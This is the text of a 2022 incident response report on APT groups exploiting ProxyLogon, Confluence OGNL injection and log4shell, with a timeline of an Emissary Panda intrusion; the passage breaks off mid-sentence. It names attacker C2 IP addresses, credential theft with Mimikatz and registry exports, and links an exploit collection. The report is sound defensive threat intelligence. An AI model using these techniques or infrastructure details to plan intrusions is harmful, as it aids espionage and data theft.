{
    "id": "7d1a783e-34b9-4f36-9a88-494a35adb5cd",
    "created_at": "2022-10-25T16:48:23.279681Z",
    "updated_at": "2025-03-27T02:17:11.684897Z",
    "deleted_at": null,
    "sha1_hash": "957289a738576160892bcaca22df777d63d586ed",
    "title": "The APT fallout of vulnerabilities such as ProxyLogon in Exchange (Hafnium), OGNL injection, and log4shell",
    "authors": "HVS Consulting",
    "file_creation_date": "2022-02-14T17:07:27Z",
    "file_modification_date": "2022-02-14T17:09:11Z",
    "file_size": 1747771,
    "plain_text": "HvS-Consulting AG\nIncident Response Report\n\n\n**Contact**\n\nHvS-Consulting AG\n\nParkring 20\n\n85748 Garching bei München\n\nGermany\n\nPhone: +49 89 890 63 62 0\n\n[E-Mail: incidentresponse@hvs-consulting.de](mailto:incidentresponse@hvs-consulting.de)\n\n[https://www.hvs-consulting.de](https://www.hvs-consulting.de/)\n\n\nHvS-Consulting AG\nIncident Response Report\n\n# The APT Fallout of Vulner- abilities such as ProxyLogon, OGNL Injection, and log4shell\n\nDate: 14.02.2022\nVersion:     1.0\nClassification:  TLP-White\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# CONTENTS OF THIS REPORT\n\n\nABSTRACT .......................................................................... 1\n\nTHE CHANGING THREAT LANDSCAPE IN 2021 ..... 2\n\n1 Just Another Incident Response investigation? . 2\n\n2 The Major Vulnerabilities in 2021 .......................... 3\n\n3 A Spotlight on the Role of APT Groups .............. 6\n\n4 Lessons Learned from 2021 .................................... 8\n\nINSIGHTS INTO AN EMISSARY PANDA ATTACK . 10\n\n5 Timeline of the Attack .............................................10\n\n5.1 Phase 1: Initial Compromise ......................................... 12\n\n5.2 Phase 2: Persistence ....................................................... 13\n\n5.3 Phase 3: Reaction and Last Data Exfiltration ........... 13\n\n6 Description of Observed TTPs ............................. 14\n\n6.1 Resource Development ................................................. 15\n\n6.2 Initial Access ...................................................................... 15\n\n6.3 Execution ............................................................................ 15\n\n6.4 Persistence ......................................................................... 16\n\n\n6.5 Privilege Escalation .......................................................... 17\n\n6.6 Defense Evasion ............................................................... 17\n\n6.7 Credential Access ............................................................ 19\n\n6.8 Discovery ............................................................................ 19\n\n6.9 Lateral Movement .......................................................... 20\n\n6.10 Collection .......................................................................... 20\n\n6.11 Command and Control.................................................. 21\n\n7 OSINT analysis of C2 infrastructure ................... 22\n\n8 Malware Analysis of HyperBro............................. 23\n\n8.1 Overview ........................................................................... 23\n\n8.2 PE Loader .......................................................................... 24\n\n8.3 Capabilities ....................................................................... 28\n\n8.4 HyperBro Configuration Extractor ............................. 30\n\n9 Detection of Emissary Pandas activities ............. 31\n\n9.1 Indicators of Compromise (IOCs) ............................... 31\n\n9.2 YARA Rules ....................................................................... 34\n\n9.3 Defender Detection Rules ............................................ 36\n\n\n# THE TWO EMPHASES OF THE REPORT\n\nTHE CHANGING THREAT LANDSCAPE IN 2021\n\nA summary of our observations of the threat\nlandscape in 2021, the activities of APT groups, and\nderived recommendations for your cyber security\nstrategy. Start reading on page 2.\n\nINSIGHTS OF AN EMISSARY PANDA ATTACK\n\nHere you find a lot of technical details like the\ntimeline, TTPs, IOCs of an Emissary Panda attack,\nincluding our malware analysis results of their\nHyperBro malware. Start reading on page 10.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# ABSTRACT\n\nProxyLogon (Hafnium) in Exchange, OGNL injection in Confluence, log4shell in the log4j library. 2021 was\nrife with critical vulnerabilities. They were exploited by ransomware gangs and hackers for mining crypto\ncurrencies. But where have the professional spies, the APT groups been? Did they miss such opportunities\nand take a vacation from cyber warfare? Surely they didn't. And we have collected evidence.\n\n## The benefactors of the scatter fire \n\nThe APT group Emissary Panda (also known as APT27, LuckyMouse) has exploited the Microsoft Exchange\nvulnerability \"ProxyLogon\", often publicly referred to as \"Hafnium\" vulnerability, to carry out targeted\nindustrial espionage. The particularly perfidious aspect of this is that they intentionally acted like \"ordinary\nhackers\" in order not to trigger a comprehensive analysis and remediation. With great success.\n\nWe analyzed several incidents and found that some customers did not seriously follow up on a ProxyLogon\ncompromise because at first glance it looked like an attack by an occasional attacker. This is how Emissary\nPanda (APT27) managed to run through the classic APT kill chain and steal trade secrets undetected for\nmonths.\n\nOur report not only provides background and details on the process, the TTPs and the IOCs, but also initial\nevidence that the OGNL injection in Confluence was and is also being of interest for targeted industrial\nespionage. The same applies for log4shell.\n\n## Strategies for Cyber Security 2022\n\nThe effects of the global vulnerabilities from 2021 will only gradually come to light.\n\nWe have to assume that numerous APT and other compromises by ProxyLogon (Exchange), OGNL\ninjection (Confluence) and log4shell (Log4j) are still undetected. Especially for log4shell, the typical\ndetection period of three to six months has not even been reached yet.\n\nIn addition, global vulnerabilities will again come to light and be exploited in 2022. Anything else would\nbe close to a miracle. Companies are therefore well advised to prepare for this. We have the following\nrecommendations based on our experience and findings, which are described more in detail in section\n_Lessons Learned from 2021 on page 8._\n\n\nPrediction\n\n- Subscribe to advisory feeds\n\n- Asset management rules! Take\ncare of your CMDB\n\n- Take any compromise seriously\n\n\nProtection\n\n- Patch critical vulnerabilities\nimmediately\n\n- Create a plan B like BCM\n\n- Readiness saves time and\nmoney\n\n- Every critical vulnerability is\nequally important\n\n\nDetection/Response\n\n- Only pros help against pros\n\n- The mean time to detect (MTD)\nmust be reduced\n\n- Thinking outside the box\n\n\nIf you want to share just the summary with your management, you will find it also short and concise on\n[our webpage: https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27/](https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# THE CHANGING THREAT LANDSCAPE IN 2021\n\n 1 Just Another Incident Response investigation?\n\nIn October 2021, one of our customers was notified by a government agency about suspicious activities\non their network. Command and Control (C2) traffic and data exfiltration was allegedly observed. After a\nquick analysis of the firewall logs, the customer was able to verify the suspicion and realize that the traffic\nhad started several months earlier.\n\nAs a result, the customer decided to investigate further and ask HvS to conduct a situation assessment. In\nthe first step of the investigation, ten internal systems with C2 traffic were identified and compromise scans\nof them were performed. These scans proofed a clear compromise of these systems and the presence of\nHyperBro, a Remote Access Tool (RAT), and other typical attack traces. A comprehensive Incident\nResponse (IR) was then initiated with the goal of analyzing the entire infrastructure to determine the level\nof compromise, identify the entry vector, uncover the actor's tactics, techniques, and procedures (TTPs),\nassess the impact, and finally plan remediation actions.\n\nUp to this point, this case was a normal Advanced Persistent Threat (APT) incident with\ncommon TTPs. The case became interesting when we correlated the Indicators of\nCompromise (IOC) of this incident with the IOCs of our previous incidents. This\ncorrelation led to unexpected matches between incidents that at first glance appeared\nto be unrelated, which is described in more detail in section A Spotlight on the Role of\n_APT Groups._\n\nOne of the first defensive measures was to deploy an Endpoint Detection and Response (EDR) tool on all\nendpoints. This was to increase visibility and provide capabilities for containment and response, which later\nproved to be crucial. While preparing for remediation, the actor began collecting data again, using the\ndomain administrator privileges it had previously gained. This allowed near real-time countermeasures by\nthe IR team, which are described in detail in _Phase 3: Reaction and Last Data Exfiltration. These_\ncountermeasures bought management the time to decide on a complete cut-off from the Internet until\nremediation was finished.\n\nThe collected IOCs from the forensic analyses, OSINT searches, the observed TTPs, and analogies between\nthe RAT and the HyperBro malware pointed to an attribution to the Emissary Panda[1] group, which was\nalso consistent with the authorities' previous assumption.\n\nOne of the most interesting facts was the determined entry vector: all identified\ntraces date back exactly to March 04, 2021, the day when the large-scale\nexploitation of the ProxyLogon vulnerability started. The first system to show\nC2 traffic was the Exchange server, and within less than an hour, additional\nsystems were affected. While the Exchange Server compromise was detected\nin March and the system was recovered during that time, the other infected\nsystems were not detected, leaving the door open for the actor. The entire\nsequence of events leads to the assumption that the exploitation of\nProxyLogon in this case was not an opportunistic attack. When asked by the\ncustomer's top management if they could imagine being on the short list of a\nChinese actor, they indicated that they were aware of this risk.\n\n1 [https://attack.mitre.org/groups/G0027/ aka APT27, TG-3390, Bronze Union, Lucky Mouse, Iron Tiger, UNC215](https://attack.mitre.org/groups/G0027/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# 2 The Major Vulnerabilities in 2021\n\nAs in every year, many vulnerabilities were discovered in 2021, for which vendors released hotfixes,\nadministrators hopefully applied them, and security personnel reviewed infrastructure for successful\nremediation. Meanwhile, hackers developed exploits and used them to compromise the remaining\nvulnerable systems and gain an advantage. Business as usual?\n\nHowever, one thing has changed in the last year: The quality of some discovered vulnerabilities was\noutstanding in terms of the software affected, the ease of exploitation and impact, and the frequency of\noccurrence was higher than ever before. However, things have also changed on the attackers' side: Some\nof these vulnerabilities were discovered not with good intentions by security researchers. They were\nsearched for in order to use them for attack campaigns. This resulted in exploits being available early and\nwidespread exploitation by various actors, sometimes even before the affected organizations could react.\n\nLooking back at 2021, the following vulnerabilities, among others, immediately come to mind:\n\n- Microsoft Exchange was affected by several security vulnerabilities in 2021, which\nbecame very critical mainly due to chaining them in attacks.\n\n   - In March 2021, ProxyLogon[2], often publicly referred to as Hafnium, was finally\nmade public, while rumors of targeted exploitation had already existed since\nNovember 2020. Immediately following the disclosure, a previously unseen\nwave of widespread exploitation followed before most organizations could respond and some\nwere not even aware of the vulnerability. During this time, we analyzed 84 Microsoft Exchange\ninstances from various customers with our preferred APT scanner THOR[3] and found that 96%\nof them were scanned for ProxyLogon and in 44% of the cases the vulnerability was also\nexploited.\n\n\nFigure 1: Scanning and exploitation of ProxyLogon in Germany.\n\n\n2 [CVE-2021-26855,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) [CVE-2021-26857,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857) [CVE-2021-26858, and CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858)\n\n3 [https://www.nextron-systems.com/thor/](https://www.nextron-systems.com/thor/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n   - ProxyLogon was just one vulnerability in a whole series of vulnerabilities that put Exchange\nenvironments at risk. There were also ProxyOracle, ProxyShell, ProxyToken, and other Remote\nCode Execution (RCE) vulnerabilities[4] with publicly available exploits, as this collection shows:\n[https://github.com/FDlucifer/Proxy-Attackchain. We received some customer requests to](https://github.com/FDlucifer/Proxy-Attackchain)\nanalyze compromised Exchange servers, claiming to have fixed the ProxyLogon vulnerability\nand not being able to explain how this could happen.\n\n   - Remarkably, the attention of administrators, security experts and the trade press decreased\nfrom vulnerability to vulnerability - despite vendor advisories, available exploits, and warnings\nabout active abuse. The Exchange issue became annoying, we heard more than once \"I just\n_can't patch Exchange anymore\" and reports about it were no longer clickbait._\n\n- In August 2021, Atlassian's Confluence was affected by an easy-to-exploit RCE\nvulnerability[5] due to a OGNL injection. Shortly after the disclosure, ready-to-use\nexploits were available, and widespread exploitation attempts were observed on the\nInternet. In this case, many publicly accessible environments were also compromised.\nIn contrast to ProxyLogon, we received comparatively few requests for proactive\nanalysis, but more requests for post-breach analysis.\n\n- The RCE vulnerability in the widely used Java library log4j[6], also known as log4shell,\nonce again generated a lot of attention on the part of defenders and attackers in\nDecember 2021. Again, it took only a few hours before the first widespread scans for\naffected systems and exploitation attempts began. With the previously mentioned\nvulnerabilities, it was easy to assess whether an organization was affected, and the\nscope of analysis was limited to individual systems. In the case of log4shell, on the other hand, the\neffort was higher, and especially the proof of successful exploitation was laborious, as it had to be\nprovided for each system individually[7]. Since it was close to Christmas and many employees were\nalready on vacation, some organizations decided to fix the vulnerability as part of their regular patch\ncycle and hope that they would not fall victim to an attack. Even though the number of attacks has\ndecreased in early 2022, we and many other security experts[8] believe that there are still many\nundiscovered vulnerabilities whose impact will only become apparent in the coming months, and that\nmany applications will remain vulnerable for a long time.\n\n[4 ProxyOracle: CVE-2021-31196 and CVE-2021-31195; ProxyShell: CVE-2021-34473,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196) [CVE-2021-34523 and CVE-2021-](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523)\n[31207; ProxyToken: CVE-2021-33766; another RCE CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207)\n\n5 [CVE-2021-26084](https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html)\n\n6 [CVE-2021-44228 and CVE-2021-44832](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)\n7 [https://www.hvs-consulting.de/en/log4j-log4shell-tips-and-guidelines-for-action/](https://www.hvs-consulting.de/en/log4j-log4shell-tips-and-guidelines-for-action/)\n\n8 [https://news.sophos.com/en-us/2022/01/24/log4shell-no-mass-abuse-but-no-respite-what-happened/](https://news.sophos.com/en-us/2022/01/24/log4shell-no-mass-abuse-but-no-respite-what-happened/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\nFigure 2: Timeline of release, global attention, and breach detection of selected vulnerabilities in 2021.\n\nLooking at the various players who were looking for, and in some cases abusing vulnerable\nsystems, four categories can be distinguished based on their motivation and impact:\n\n- As usual, many security researchers have tried to map the attack surface and/or to\nwarn the affected organizations. Even if they do not compromise systems during\nscanning, they leave traces. Operators must spend time to figure out the intent of the attack attempt.\n\n- The largest group were script kiddies and hobbyists who tried to exploit these vulnerabilities for fun or\nto achieve certain smaller goals like deploying crypto miners or web shells[9]. Since they usually do not\ntry to move laterally, the impact was limited to the compromised system.\n\n- The group with the most attention were opportunistic cybercrime gangs, especially ransomware\ngroups, or professional hackers with the goal of sabotaging and extorting organizations or placing\nbackdoors and selling access to companies on the black market. In case of successful ransomware\nattacks, high financial and business impact was caused.\n\n- But there is a fourth group, often overlooked, that has benefited from the scatter fire of the previously\nmentioned attackers: APT groups and advanced hackers. Because their attacks are more targeted, the\ntotal number of attacks is lower. The number of unreported cases is also much higher, as the impact\nis not as obvious to the public as in the case of ransomware. The actual impact through stolen\ninformation and intellectual property is also difficult to assess. Since many victims are not aware of the\nrisk of becoming victims of espionage, APT groups are often underestimated as actors.\n\n[9 IOCs from a ProxyShell exploitation: https://github.com/hvs-consulting/ioc_signatures/tree/main/Proxyshell](https://github.com/hvs-consulting/ioc_signatures/tree/main/Proxyshell)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# 3 A Spotlight on the Role of APT Groups\n\nBased on the knowledge that APT groups also exploited these vulnerabilities, which is not\nat all surprising, we conducted more in-depth research and correlated IOCs with related\nIR engagements. In doing so, we made an interesting observation.\n\nProxyLogon played a special role among last year's high-profile vulnerabilities, as it was\nnot only widely abused by APT groups. The more prominent name \"Hafnium\" is not derived from the\nmetal, but from the APT group Hafnium. Shortly after the critical vulnerabilities in Microsoft Exchange\nbecame public, there were many reports about APT groups actively abusing this flaw:\n\n- Hafnium[10], which is suspected being first in detecting and exploiting those vulnerabilities[11]:\n\n- Emissary Panda[12], whose activities we describe in more detail in this document.\n\n- Fancy Bear[13], which is known to attack Microsoft Exchange instances for a long time[14] and recently new\nactivities in Germany were observed.\n\n- Tick, Calypso, Websiic, Winnti Group[15] and a not precisely specified Iranian government-sponsored\nAPT actor[16] and certainly, many groups more.\n\nAs for the critical RCE in Confluence, the situation seems to be completely different. If you search reports,\nblogs, and other security feeds, you will mainly find information about abuse to deploy crypto miners. For\nthe time being, we can confirm this observation, as we have also found this behavior in various\ninvestigations of compromised Confluence servers. In addition, there are single reports that ransomware\ngroups also occasionally abuse this vulnerability. To our knowledge, there have been several instances\nwhere attackers exploited this vulnerability shortly after its disclosure, installed RAT tools, and waited for a\nhighly privileged administrator to log in. Once control over the infrastructure was established, all the\nvictim's systems were started to be encrypted.\n\nSo far, nothing has been found in the public about the connection between APT groups and the use of\nthe OGNL injection vulnerability to gain a foothold in victims' infrastructures. During malware analysis of\nthe Emissary Panda incident mentioned earlier, we found an additional C2 IP in the configuration. This IP\nhas never been reported as malicious or abused and appears to be part of Emissary Panda's dedicated\ninfrastructure and not a compromised third-party system.\n\n10 [https://attack.mitre.org/groups/G0125/ aka Operation Exchange Marauder](https://attack.mitre.org/groups/G0125/)\n\n11 [https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\n\n12 [https://attack.mitre.org/groups/G0027/ aka APT27, TG-3390, Bronze Union, Lucky Mouse, Iron Tiger, UNC215](https://attack.mitre.org/groups/G0027/)\n\n13 [https://attack.mitre.org/groups/G0007/ aka APT28, Sofacy, Pawn Storm, Strontium, Tasr Team](https://attack.mitre.org/groups/G0007/)\n\n14 [https://attack.mitre.org/techniques/T1190/](https://attack.mitre.org/techniques/T1190/)\n15 [https://cybernews.com/security/10-apt-groups-that-joined-the-ms-exchange-exploitation-party/](https://cybernews.com/security/10-apt-groups-that-joined-the-ms-exchange-exploitation-party/)\n\n16 [https://www.cisa.gov/uscert/ncas/alerts/aa21-321a](https://www.cisa.gov/uscert/ncas/alerts/aa21-321a)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\nThanks to the detailed tracking of all IOCs of our incidents in a MISP[17], the correlations between the events\nwere easily identified due to the C2 IP. These events belong to analyses of compromised Confluence\nservers that were previously performed and revealed crypto miner infections, but no evidence of RATs or\nlateral movement. In a few analyses, we identified this IP as a node scanning for vulnerable Confluence\nsystems.\n\nKnowing that this IP is part of Emissary Panda's infrastructure and was rarely used in their campaigns\nsuggests that Emissary Panda was also scanning for vulnerable Confluence instances. Thus, the tactic of\n“flying under the radar” was a complete success.\n\nFigure 3: Correlation of a so far unknown Emissary Panda C2 IP to IR engagements of compromised Confluence servers.\n\nIn contrast, the log4shell vulnerability in log4j received more attention from the security community, IT\norganizations, and the press - not just the specialist press. But all kinds of attackers were also attracted to\nthis vulnerability. One reason for this could also be that the effort required to identify and mitigate the\nvulnerability is much higher for the affected organizations, making it more likely for attackers to benefit\nfrom exploitation capabilities over a longer period. Reports and alerts were published very quickly[18],\nreminding again to take preventive measures, as almost the same APT groups as ProxyLogon were seen\nactively exploiting the vulnerability:\n\n- Hafnium\n\n- Emissary Panda[19]\n\n- Charming Kitten - an Iranian government-sponsored actor\n\n- And many groups more\n\nAlthough there have not yet been any incident response deployments where the entry vector has been\nidentified as a log4shell misuse, we expect this to happen within the next few weeks or months, which is\nstill the average time to breach discovery.\n\n17 [https://github.com/MISP/MISP](https://github.com/MISP/MISP)\n\n18 [https://therecord.media/log4shell-attacks-expand-to-nation-state-groups-from-china-iran-north-korea-and-](https://therecord.media/log4shell-attacks-expand-to-nation-state-groups-from-china-iran-north-korea-and-turkey/)\n[turkey/ and https://www.securityweek.com/microsoft-spots-multiple-nation-state-apts-exploiting-log4j-flaw](https://therecord.media/log4shell-attacks-expand-to-nation-state-groups-from-china-iran-north-korea-and-turkey/)\n\n19 [https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/](https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# 4 Lessons Learned from 2021\n\nLooking ahead to 2022 and the following years, we do not assume that there will be fewer critical\nvulnerabilities and attacks. Rather, the opposite will be the case! Therefore, every organization must think\nabout how it is going to deal with the threat situation in the future.\n\nPrediction: It becomes more and more important to be in front of the wave!\n\n- This can be achieved by implementing mechanisms that provide early warnings about\nnewly discovered vulnerabilities, remediation actions, and hotfixes. The most reliable\nsource are the manufacturers' advisory feeds, since relying on the specific press or\nwarnings from authorities naturally entails a certain time delay and should therefore\nonly be the fallback solution.\n\n- In order to quickly assess whether and to what extent you are affected by a vulnerability, a good\nknowledge of your infrastructure and especially the publicly accessible parts - regardless of whether\nthey are on-premises or in a cloud - is crucial, i.e., a well-filled Configuration Management\nDatabase (CMDB) / asset management is a must.\n\n- In addition, it is helpful to be aware of the threat situation, incorporate it into your risk analysis, and\nplan appropriate countermeasures. While any company can fall victim to opportunistic cybercrime,\nassessing the likelihood of targeted attacks is more difficult. Despite all the challenges, it is negligent\nto ignore these risks. Even if protection against targeted attacks is not the primary goal, early\nimplementation of protective measures is an investment in the future, as cybercriminals often mimic\nthe TTPs of APT groups.\n\nProtection: Defined processes and workflows for rapid reaction are key!\n\n- In order to be able to act quickly in the event of a newly discovered threat, a\ncoordinated and tested processes must be in place. While normal patch management\nprocesses often allow a grace period of a few days or even several weeks before\npatches must be applied, emergency processes must be in place to react within a few\nhours in such cases.\n\n- A patch is not always immediately available or applicable, so a range of containment measures must\nbe prepared, for example in the case of ProxyLogon, which blocks Internet access to Outlook Web\nApp and ActiveSync. The impact on business processes must be considered, and appropriate Business\nContinuity Management (BCM) plans with decision criteria and authorities must be defined. Especially\nwhen critical business services are affected, it is difficult to make the decision between business impact\nand IT infrastructure compromise without being prepared.\n\n- Another important aspect is to be able to act at any time. Many vulnerabilities become known shortly\nbefore the weekend or during the vacation season. Attackers are distributed all over the world and\nsometimes specifically wait for such off-peak times. You must be able to react to a changed threat\nsituation at any time - both on the technical and on the management level.\n\n- As the handling of ProxyOracle, ProxyShell, and to some extent the Confluence vulnerability has shown,\nthe resources of many IT departments were overloaded, which delayed remediation or even led to\nresignation. As with operational incidents, time reserves must be planned for security incidents, both\nin the security teams and in IT.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n- Not all attackers exploit vulnerabilities immediately, sometimes they wait until the first waves are over\nand thus the attention dies down. Even if there are no exploits available for every vulnerability or active\nexploitation has been observed, the reverse conclusion does not apply here that these are less critical.\nEvery high-rated or critical vulnerability must be equally important to you.\n\nDetection and response: Be prepared for the next high-profile vulnerability!\n\n- Capabilities are needed to determine appropriate strategies and techniques for\ndetecting potentially compromised assets, identifying exploitation attempts,\nevaluating whether they have been successful, and recommending next steps or\neven directly initiating forensic investigations. Such capabilities should be\nconsidered sovereign tasks, as the resources of security service providers are also\nlimited. Similar events such as ProxyLogon or log4shell may cause bottlenecks,\nespecially if no contracts have been concluded beforehand.\n\n- The average time to detection of successful attacks needs to be shortened, as huge spread and\ndamage can occur within a period of three to six months. For opportunistic attacks, the time periods\nare much shorter, but the past has shown that with a quick and rigorous response, even ransomware\nattacks can successfully be stopped before encryption begins.\n\n- If systems have been compromised or suspicions have been raised, a thorough analysis of the level of\ncompromise of the entire environment is critical. At a minimum, the analysis objectives must be\n\n - \"Can the known IOCs be detected on other systems?\"\n\n - \"What credentials may have been exposed and has data been exfiltrated?\"\n\nIf you underestimate this step, you may miss the chance to get ahead of the attackers and stop them\nat the beginning of the attack chain, as the following sections show.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# INSIGHTS INTO AN EMISSARY PANDA ATTACK\n\n 5 Timeline of the Attack\n\nThe attack can roughly be divided in three phases.\n\n- The first phase was the initial compromise and achievement of objectives. The objectives included the\nprivilege escalation and espionage of intellectual property.\n\n- The second phase was the persistence phase, which lasted for seven months.\n\n- In the final phase, the attackers changed their persistence strategy from Phase 2 and attempted to\nexfiltrate data again. This was likely a reaction to a detection of an attack to another company with the\nsame IOCs.\n\nFigure 4: Attack Phases\n\nThe following table describes the timeline of the attack with anonymous hostnames. The timestamps were\nconverted to UTC+0. The “Attacker” column describes which resource (IP, compromised system, etc.) the\nattacker uses, and the “Target” column describes the system, which is targeted by the activity.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\nTimestamp[20] Target Attacker Comment\n\nPhase 1\n\n2021-03-04 07:40 EX01 104.168.236.46\naddress\n\n2021-03-04 08:36 Client01\n\n2021-03-04 08:36 Client01 104.168.236.46\n\n2021-03-04 08:39 FS01\nsystem\n\n2021-03-04 08:39 FS01\n\n2021-03-04 08:39 FS01 104.168.236.46\n\n2021-03-04 14:40 FS01 Creation of Rar.exe on FS01\n\n2021-03-07 18:03 APP01 104.168.236.46\n\nPhase 2\n\n2021-04-23 15:57 Intranet\n\n2021-04-23 16:02 APP02\nAPP01\n\n2021-04-23 16:03 APP02 104.168.236.46\n\n2021-08-19 10:30 APP01 87.98.190.184 C2 communication of APP1\n\nPhase 3\n\n2021-10-18\n\n2021-10-18 21:46 APP01 & 87.98.190.184\nAPP02\n\n2021-10-31 06:31 APP03 87.98.190.184 C2 communication\n\n2021-10-31 18:50 APP04 APP01 Lateral Movement\n\n2021-10-31 18:53 APP04 87.98.190.184 C2 communication\n\n2021-11-09 15:59 FS01 Intranet\n\n2021-11-09 16:03 FS01 Intranet\n\n2021-11-09 16:05 FS01 Intranet Remote creation of\n\n2021-11-09 16:06 FS01 Intranet\nwmic\n\n2021-11-09 16:09 APP05 Reconnaissance with\n\n2021-11-09 16:25 FS01 Local execution of\n\n20 All timestamps in this report are given in UTC+0\n\n|Col1|Col2|Col3|Phase 1|\n|---|---|---|---|\n|2021-03-04 07:40|EX01|104.168.236.46|C2 communication between Exchange Server and C2 IP address|\n|2021-03-04 08:36|Client01||Drop and execution of HyperBro backdoor on a client system|\n|2021-03-04 08:36|Client01|104.168.236.46|Beginning of C2 communication|\n|2021-03-04 08:39|FS01||Drop and execution of HyperBro backdoor on File server system|\n|2021-03-04 08:39|FS01||Creation of a Windows Service for persistence|\n|2021-03-04 08:39|FS01|104.168.236.46|Beginning of C2 communication|\n|2021-03-04 14:40|FS01||Creation of Rar.exe on FS01|\n|2021-03-07 18:03|APP01|104.168.236.46|First C2 communication of APP01|\n\n|Col1|Col2|Col3|Phase 2|\n|---|---|---|---|\n|2021-04-23 15:57|Intranet||Drop and execution of HyperBro backdoor on Intranet server|\n|2021-04-23 16:02|APP02||Drop and execution of HyperBro backdoor on Database of APP01|\n|2021-04-23 16:03|APP02|104.168.236.46|First C2 communication of the Database System APP02|\n|2021-08-19 10:30|APP01|87.98.190.184|C2 communication of APP1|\n\n|Col1|Col2|Col3|Phase 3|\n|---|---|---|---|\n|2021-10-18|||Attacker changed DNS Domain entry to 127.0.0.1|\n|2021-10-18 21:46|APP01 & APP02|87.98.190.184|C2 communication of APP01 & APP02|\n|2021-10-31 06:31|APP03|87.98.190.184|C2 communication|\n|2021-10-31 18:50|APP04|APP01|Lateral Movement|\n|2021-10-31 18:53|APP04|87.98.190.184|C2 communication|\n|2021-11-09 15:59|FS01|Intranet|Reconnaissance with wmic and tasklist|\n|2021-11-09 16:03|FS01|Intranet|Remote creation of batch script with wmic|\n|2021-11-09 16:05|FS01|Intranet|Remote creation of Rar.exe (WinRar)|\n|2021-11-09 16:06|FS01|Intranet|Begin of targeted collection by executing Rar.exe remotely via wmic|\n|2021-11-09 16:09||APP05|Reconnaissance with net.exe|\n|2021-11-09 16:25||FS01|Local execution of Rar.exe|\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n|Timestamp20|Target|Attacker|Comment|\n|---|---|---|---|\n|2021-11-09 16:38||FS01|Creation of first Rar package for exfiltration|\n|2021-11-09 16:48|FS01|APP05|Testing of different credentials in net use command for mounting the IPC share|\n|2021-11-09 16:53||APP02|Execution of Mimikatz|\n|2021-11-09 16:54||APP02|Exports of Registry (SAM, SYSTEM, SECURITY)|\n|2021-11-09 16:58||APP02|Packaging of Registries with Rar.exe|\n|2021-11-09 19:28|FS01|APP02|Another try of targeted collection by executing Rar.exe locally but by specifying remote shares in the command|\n\n\nInternet Cutoff and Remediation\n\n\n## 5.1 Phase 1: Initial Compromise\n\nFigure 5 provides a simplified overview of the attack, the C2 channels, and the compromised systems.\n\nFigure 5: Attacker’s course of action during Phase 1.\n\nThe first known activity of the attack occurred on 04.03.2021 at 07:40 (UTC+0) with the first communication\nfrom the Exchange Server (EX01) to a known C2 IP address of the attacker. It is assumed that the initial\ncompromise occurred shortly before this event. Since the first C2 communication originated from the\nExchange Server, and the event occurred very close to the first disclosure of the ProxyLogon vulnerability\nby Microsoft, the initial access vector is assumed to be ProxyLogon.\n\nAbout an hour after the initial compromise, Emissary Panda moved laterally to the file server as well as to\na client. On both of these systems the HyperBro backdoor was dropped, as described in Section 8. On the\nsame day, a file with the name “Rar.exe” was created on the server fileserver. The fact that the fileserver\nwas the first target, and the creation of “Rar.exe”, support the thesis that the main objective of the attack\nwas espionage of intellectual property. With full access to the fileserver the objectives were fulfilled in the\nfirst days of the attack.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 5.2 Phase 2: Persistence\n\nAfter the objectives of initial access and data exfiltration were fulfilled, the next objective of this APT was\npersistence and remaining undetected (long-term access). These objectives were achieved in Phase 2 of\nthe attack, which lasted from 08.03.2021 to 18.10.2021. During this time, only sparse activity from Emissary\nPanda was identified.\n\nThe activity includes regular beaconing to C2 addresses. Furthermore, irregular lateral movement to new\nsystems was identified. This was probably performed to strengthen their persistence and protect their\naccess against system replacements. At least two new systems were compromised during Phase 2.\n\n## 5.3 Phase 3: Reaction and Last Data Exfiltration\n\nIn the last phase of the attack, something tipped Emissary Panda of, and they started to change their\nbehavior. Our best guess is that they noticed responsive 